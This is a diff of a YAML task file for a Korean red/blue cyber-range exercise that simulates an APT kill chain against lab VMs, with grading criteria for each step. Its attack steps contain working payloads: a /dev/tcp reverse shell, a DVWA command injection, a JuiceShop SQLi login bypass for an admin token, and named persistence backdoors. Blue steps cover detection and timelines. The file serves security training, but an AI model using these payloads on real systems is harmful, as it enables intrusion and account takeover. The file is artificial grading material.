@@ -35,20 +35,22 @@ steps:
     expect: Stealthy recon complete
     field: stdout
     semantic:
-      intent: '[RED] 실전 공방전 4 - 공격 기법 실행'
+      intent: '[RED] APT Kill Chain Phase 1 Reconnaissance — whois web.target + dig DNS A/MX + shodan
+        search + curl headers (은밀한 passive recon 우선, active 최소). Lockheed Martin Cyber Kill Chain 첫 단계.
+        탐지 회피 위해 third-party 소스 활용, 직접 probe 최소화. MITRE T1590 Gather Victim Info'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - passive 정찰 우선 (whois/dig/shodan)
+      - 은밀성 강조 (직접 스캔 최소화)
+      - Kill Chain 1단계 + T1590 매핑
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - whois + dig NS/MX + theHarvester
+      - shodan search hostname:<target>
+      - curl -sI 로 헤더 (단발 요청)
+      - passive DNS 서비스
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - nmap 대량 스캔 (은밀성 상실)
+      - Kill Chain 개념 없음
+      - T1590 매핑 없음
   target_vm: attacker
   script: nmap -sV -T2 -p 22,80,3000,8080 --max-retries 1 --host-timeout 30s 10.20.30.80 -oX /tmp/apt_recon.xml
     && echo 'Stealthy recon complete'
@@ -70,20 +72,22 @@ steps:
     expect: Payload weaponized
     field: stdout
     semantic:
-      intent: '[RED] 실전 공방전 4 - 공격 기법 실행'
+      intent: '[RED] APT Kill Chain Phase 2 Weaponization — 정찰 결과 기반 맞춤 페이로드 준비. msfvenom 으로 reverse shell·SQLi
+        payload 파일 생성·Metasploit resource script·Cobalt Strike beacon 설정. 대상 기술 스택(Apache/Node.js)에 최적화.
+        MITRE T1587 Develop Capabilities'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - 페이로드 생성 도구 사용 (msfvenom/sqlmap/커스텀)
+      - 대상 맞춤 (기술 스택 반영)
+      - Kill Chain 2단계 + T1587 매핑
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - msfvenom -p linux/x64/meterpreter/reverse_tcp
+      - sqlmap --tamper 조합 payload 생성
+      - C2 framework (Sliver/Mythic)
+      - Cobalt Strike malleable C2 profile
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 범용 페이로드만 (맞춤 없음)
+      - Weaponization 단계 인지 없음
+      - 정찰 결과 반영 없음
   target_vm: attacker
   script: 'echo ''#!/bin/bash'' > /tmp/payload.sh && echo ''bash -i >& /dev/tcp/10.20.30.201/4443 0>&1''
     >> /tmp/payload.sh && chmod +x /tmp/payload.sh && echo ''Payload weaponized: reverse shell to 10.20.30.201:4443'''
@@ -104,20 +108,22 @@ steps:
     expect: 127.0.0.1
     field: stdout
     semantic:
-      intent: '[RED] 실전 공방전 4 - 공격 기법 실행'
+      intent: '[RED] APT Kill Chain Phase 3 Delivery — DVWA Command Injection 으로 web 서버에서 내부 정보 추출 (id·hostname·uname·crontab·ifconfig·ps).
+        초기 접근 벡터로 alreadyexposed 취약점 활용. Kill Chain Delivery + Exploitation 경계 (페이로드 전달 + 실행). MITRE T1190
+        Exploit Public-Facing App'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - DVWA Command Injection 페이로드 전달
+      - 내부 정보 추출 (id/hostname/uname 등)
+      - Kill Chain 3단계 + T1190
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - curl -b cookie + /vulnerabilities/exec/ POST
+      - sqlmap --os-shell
+      - metasploit drupal_drupalgeddon2
+      - webshell 업로드
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 정보 추출 없이 페이로드만
+      - 외부 (Delivery) 경로 설명 없음
+      - T1190 매핑 없음
   target_vm: attacker
   script: "curl -c /tmp/dvwa_apt.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php\
     \ && curl -b /tmp/dvwa_apt.txt \\\n  -d 'ip=127.0.0.1;cat+/etc/hostname&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
@@ -139,20 +145,22 @@ steps:
     expect: Detection analysis complete
     field: stdout
     semantic:
-      intent: '[BLUE] 실전 공방전 4 - 탐지·방어 구현'
+      intent: '[BLUE] 초기 침투 탐지 — Suricata fast.log 에서 WEB-ATTACK·CMD 경보 + Apache access.log 에서 /exec/
+        요청 + 비정상 URL 패턴 (;·|·$(·&) grep. APT 의 초기 접근은 is-정찰 시 은밀했어도 exploitation 단계에서는 시그니처 남김. 이 순간 탐지가
+        contain 의 핵심'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - Suricata + Apache 교차 조회
+      - /exec/ + 명령 구분자 패턴 탐지
+      - Kill Chain 중 탐지 지점 인식
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - grep /exec/ + ; access.log
+      - jq alert WEB-ATTACK eve.json
+      - Wazuh Apache 디코더
+      - ModSec CRS 경보
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 초기 접근 단계 인식 없음
+      - 네트워크 또는 호스트 한쪽만
+      - APT 맥락 없음
   target_vm: secu
   script: echo '=== Suricata ===' && tail -10 /var/log/suricata/fast.log && echo '=== Detection analysis
     complete ==='
@@ -174,20 +182,21 @@ steps:
     expect: Admin token acquired
     field: stdout
     semantic:
-      intent: '[RED] 실전 공방전 4 - 공격 기법 실행'
+      intent: '[RED] APT Kill Chain Phase 4 Exploitation — JuiceShop SQLi 인증 우회 (/rest/user/login) 로 관리자
+        JWT 획득 + /api/Users 전체 사용자 조회 + admin 권한 시뮬레이션. 취약점 실제 악용 단계. MITRE T1078 Valid Accounts (권한 탈취)'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - JuiceShop SQLi 로 관리자 토큰 획득
+      - /api/Users 또는 admin 기능 접근
+      - Kill Chain 4단계 Exploitation + T1078
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - curl POST /rest/user/login SQLi + token 추출
+      - 'Authorization: Bearer <token> 로 /api 접근'
+      - python requests 자동화
+      - Burp 매크로로 체이닝
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 토큰 획득 후 활용 없음
+      - Exploitation 단계 명시 없음
+      - T1078 매핑 없음
   target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"'' or 1=1--","password":"x"}'' | jq -r ''.authentication.token'' 2>/dev/null) && echo
@@ -240,20 +249,22 @@ steps:
     expect: APT Persistence Plan
     field: stdout
     semantic:
-      intent: '[RED] 실전 공방전 4 - 공격 기법 실행'
+      intent: '[RED] APT Kill Chain Phase 5 Installation — 지속성 계획 수립 문서 /tmp/persistence_plan.txt 에 3가지
+        후보: SSH 키 백도어 (authorized_keys T1098.004) · cron 예약 작업 (T1053.003) · systemd user service (T1543.002).
+        탐지·제거 난이도 + 재부팅 내성 비교. 실제 설치는 접근 권한에 따라 결정'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - /tmp/persistence_plan.txt 또는 계획 문서 생성
+      - 3가지 지속성 기법 비교 (SSH/cron/systemd)
+      - MITRE T10xx 매핑
+      - Kill Chain 5단계 Installation
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - echo heredoc 으로 비교표
+      - 실제 설치는 접근 권한 하에서만
+      - MITRE ATT&CK 매트릭스 참조
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 실제 백도어 설치 (파괴적 단계)
+      - Kill Chain 5단계 인지 없음
+      - 기법 1종만 제시
   target_vm: attacker
   script: 'cat > /tmp/persistence_plan.txt << ''EOF''
 
@@ -307,20 +318,22 @@ steps:
     expect: Persistence scan complete
     field: stdout
     semantic:
-      intent: '[BLUE] 실전 공방전 4 - 탐지·방어 구현'
+      intent: '[BLUE] 지속성 기법 탐지 — 3가지 벡터 일괄 검사: find /home /root -name authorized_keys -exec cat (SSH
+        키 백도어 T1098.004) + cat /etc/crontab + ls /etc/cron.d/ (cron T1053.003) + systemctl --user list-units
+        + ls ~/.config/systemd/user/ (systemd user service T1543.002). 비정상 항목은 공격자 설치 가능성'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - authorized_keys + crontab + systemd 3종 검사
+      - MITRE T1098.004/T1053.003/T1543.002 매핑
+      - 비정상 항목 탐지 기준
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - find + cat authorized_keys + crontab + systemctl
+      - Wazuh rootcheck 자동화
+      - auditd -w /etc/cron.d -p wa
+      - Sysdig Falco 룰
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 3종 중 일부만 검사
+      - T10xx 매핑 없음
+      - 비정상 판단 기준 없음
   target_vm: web
   script: echo '=== SSH Keys ===' && find /home -name 'authorized_keys' -exec wc -l {} \; 2>/dev/null
     && echo '=== Cron ===' && cat /etc/crontab | grep -v '^#' | grep -v '^$' && echo '=== Recent systemd
@@ -344,20 +357,22 @@ steps:
     expect: complete
     field: stdout
     semantic:
-      intent: '[BLUE] 실전 공방전 4 - 탐지·방어 구현'
+      intent: '[BLUE] Wazuh APT 타임라인 재구성 — jq select(.event_type or .rule) | {ts: .timestamp, src: .data.srcip,
+        desc: .rule.description} alerts.json | sort 로 timestamp 기준 APT 전체 활동 순서 재구성. Recon(s1)→Weaponization(s2)→Delivery(s3)→Exploitation(s5)→Installation(s6)
+        단계별 이벤트 매핑. Incident Timeline 포렌식 기초'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - timestamp 기준 정렬 + 순서 재구성
+      - Kill Chain 단계별 이벤트 매핑 시도
+      - 공격자 전체 활동 윤곽
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - jq + sort -k1 (timestamp)
+      - Wazuh Kibana timeline 시각화
+      - Elastic SIEM Timeline View
+      - Timesketch 오픈소스 타임라인
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - timestamp 정렬 없음
+      - Kill Chain 단계 매핑 없음
+      - 단일 이벤트만
   target_vm: siem
   script: sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -30 | jq -r '[.timestamp, .rule.level,
     .rule.description] | @tsv' 2>/dev/null | sort | tail -15 || echo 'SIEM timeline reconstruction complete'
@@ -438,20 +453,22 @@ steps:
     expect: MITRE ATT&CK Mapping
     field: stdout
     semantic:
-      intent: 실전 공방전 4 공방전 실습 스텝
+      intent: '[공통] APT Kill Chain → MITRE ATT&CK 매핑 /tmp/kill_chain_attack_mapping.txt — 7단계(Recon/Weaponize/Deliver/Exploit/Install/C2/Actions)
+        각각에 MITRE Tactics (TA0043/TA0042/...) + Techniques (T1590/T1587/T1190/T1078/T1098/T1071/T1005)
+        매핑. Lockheed Kill Chain 와 MITRE ATT&CK 두 프레임워크 대조. 정부·기업 표준 위협 모델링'
       success_criteria:
-      - instruction 목표 실행
-      - 결과 출력
-      - 공방전 맥락 언급
+      - /tmp/kill_chain_attack_mapping.txt 또는 매핑 표
+      - 7단계 Kill Chain + MITRE TA/T 매핑
+      - 두 프레임워크 대조
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - echo heredoc 매핑 표
+      - MITRE ATT&CK Navigator JSON
+      - D3FEND 방어 매핑 추가
+      - VERIS 프레임워크
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - Kill Chain 또는 ATT&CK 한쪽만
+      - 매핑 없음
+      - 프레임워크 표준 언급 없음
   target_vm: attacker
   script: 'cat > /tmp/apt_attack_mapping.txt << ''EOF''
 
@@ -607,20 +624,22 @@ steps:
     expect: /tmp/apt_battle_report.txt
     field: filesystem
     semantic:
-      intent: '[BLUE] 실전 공방전 4 - 탐지·방어 구현'
+      intent: '[BLUE] APT 시뮬레이션 종합 보고서 /tmp/apt_simulation_report.txt — 서비스 가용성 최종 체크 + Kill Chain 7단계
+        각 공격 시도 결과 + 각 단계별 탐지 여부·MTTR·미탐지 gap + 방어 강화 권고(정찰 탐지·passive DNS·behavioral analytics·FIM·EDR).
+        APT 방어의 total view. Threat Intelligence 산출물'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - /tmp/apt_simulation_report.txt 파일 생성
+      - Kill Chain 각 단계 탐지 결과
+      - 가용성 + 탐지 gap + 강화 권고
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file << EOF heredoc
+      - STIX 2.1 포맷 (구조화된 위협 정보)
+      - MITRE ATT&CK Navigator 시각화
+      - Red Canary annual report 스타일
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 가용성 또는 TTP 분석 한쪽만
+      - 강화 권고 없음
+      - Kill Chain 단계별 분석 누락
   target_vm: attacker
   script: 'cat > /tmp/apt_battle_report.txt << ''EOF''
 
